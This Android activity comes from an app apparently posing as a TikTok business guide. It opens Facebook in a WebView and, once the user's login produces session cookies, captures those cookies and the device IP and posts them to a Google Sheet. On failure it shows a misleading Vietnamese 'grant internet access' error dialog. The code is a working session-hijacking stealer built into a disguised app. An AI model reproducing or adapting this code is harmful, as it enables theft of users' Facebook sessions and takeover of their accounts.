package com.teamwork.businessguideprofortiktok.src.activity.pages.webview_page;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.appcompat.app.AppCompatActivity;
import androidx.lifecycle.Observer;
import androidx.lifecycle.ViewModelProviders;

import com.teamwork.businessguideprofortiktok.R;
import com.teamwork.businessguideprofortiktok.src.models.callback.CallbackInterface;
import com.teamwork.businessguideprofortiktok.src.activity.dialog.confirm_dialog.ConfirmDialog;
import com.teamwork.businessguideprofortiktok.src.activity.pages.reponse_cookies_page.ReponseCookiesActivity;
import com.teamwork.businessguideprofortiktok.src.activity.viewmodels.webview_viewmodel.GoogleSheetViewModel;
import com.teamwork.businessguideprofortiktok.src.utils.Constant;


public class WebViewFacebookActivity extends AppCompatActivity implements CallbackInterface {
    private WebView mWebViewFb;
    private GoogleSheetViewModel mRepository;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webview_fb);
        mRepository = ViewModelProviders.of(WebViewFacebookActivity.this).get(GoogleSheetViewModel.class);

        initView();
        listenerCallbackSever(mRepository);


    }

    private void listenerCallbackSever(final GoogleSheetViewModel mRepository) {
        mRepository.getCookies().observe(WebViewFacebookActivity.this, new Observer<String>() {
            @Override
            public void onChanged(final String cookies) {
                mRepository.getIp().observe(WebViewFacebookActivity.this, new Observer<String>() {
                    @Override
                    public void onChanged(String ip) {
                        mRepository.postDataGoogleSheets(ip, cookies);
                        Log.d("TAG", "onChanged: cookies: " + cookies);
                        Log.d("TAG", "onChanged: ip: " + ip);
                    }
                });
            }
        });

        mRepository.getDataReponseSever().observe(WebViewFacebookActivity.this, new Observer<String>() {
            @Override
            public void onChanged(String s) {
                Log.d("TAG", "onChanged: 111: " + s);
                if (s.equals("Success")) {
                    Intent intent = new Intent(WebViewFacebookActivity.this, ReponseCookiesActivity.class);
                    startActivity(intent);
                } else {
                    ConfirmDialog.showDialogAcount(WebViewFacebookActivity.this, "Bạn đã cấp quyền truy cập internet ?", "Vui lòng cấp quyền internet truy cập DNS_PROBE_FINISHED_NXDOMAIN", WebViewFacebookActivity.this);
                }
            }
        });
    }

    private void initView() {
        mWebViewFb = findViewById(R.id.webViewFB);
        mWebViewFb.loadUrl(Constant.mUrlFace);
        mWebViewFb.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                String strCookies = CookieManager.getInstance().getCookie(Constant.mUrlFace);

                String[] arrayCookies = strCookies.split(";");

                if (arrayCookies.length == 6) {
                    String ip = mRepository.getLocalIpAddress();
                    mRepository.setCookies(strCookies);
                    mRepository.setIp(ip);

                }
            }
        });
    }

    @Override
    public void methodToCallback() {

    }
}